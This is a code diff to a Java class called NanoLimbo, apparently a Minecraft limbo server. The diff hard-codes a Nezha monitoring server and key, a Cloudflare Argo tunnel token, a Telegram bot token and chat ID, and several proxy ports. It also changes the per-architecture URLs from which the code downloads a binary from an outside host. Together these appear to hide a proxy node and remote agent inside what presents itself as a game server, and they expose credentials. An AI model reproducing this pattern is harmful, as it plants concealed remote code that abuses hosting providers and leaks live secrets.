@@ -38,7 +38,7 @@ public final class NanoLimbo {
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
+        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "S5_PORT", "ANYTLS_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
     };
     
@@ -122,23 +122,26 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
+        envVars.put("UUID", "505bc7c0-8f2a-44f7-bdf4-8e37a8f2e896");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "");
-        envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "");
-        envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "");
+        envVars.put("NEZHA_SERVER", "nz.xx66.nyc.mn");
+        envVars.put("NEZHA_PORT", "443");
+        envVars.put("NEZHA_KEY", "CHIdoljhRqb68fdT8I");
+        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_DOMAIN", "hidencloud-sg.dora.fr.cr");
+        envVars.put("ARGO_AUTH", "eyJhIjoiODYxM2UxNGFjMzJjZmQ1ZGFjZDlkZWJlOTljNzlhOGQiLCJ0IjoiOGEwNDkyYzEtY2VkOC00NzcwLTk0OTctNzk0NDdiNDI2OTlhIiwicyI6Ik1EaG1aak5tWVRNdE9UTmxPUzAwT0dNMExXSXhaRGN0TVRoak9XWmxabU0yTWpGaSJ9");
+        envVars.put("HY2_PORT", "25423");
+        envVars.put("TUIC_PORT", "24716");
+        envVars.put("REALITY_PORT", "25423");
+        envVars.put("S5_PORT", "24716");
+        envVars.put("ANYTLS_PORT", "");
+        envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "cf.877774.xyz");
+        envVars.put("CHAT_ID", "453472010");
+        envVars.put("BOT_TOKEN", "7126463574:AAHSLx2WwHJSa3gpujRj64JhpEpCqsJcUZs");
+        envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "Mc");
+        envVars.put("NAME", "hidencloud新加坡游戏机");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -176,11 +179,11 @@ public final class NanoLimbo {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/s-box";
+            url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/s-box";
+            url = "https://arm64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/s-box";
+            url = "https://s390x.ssss.nyc.mn/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
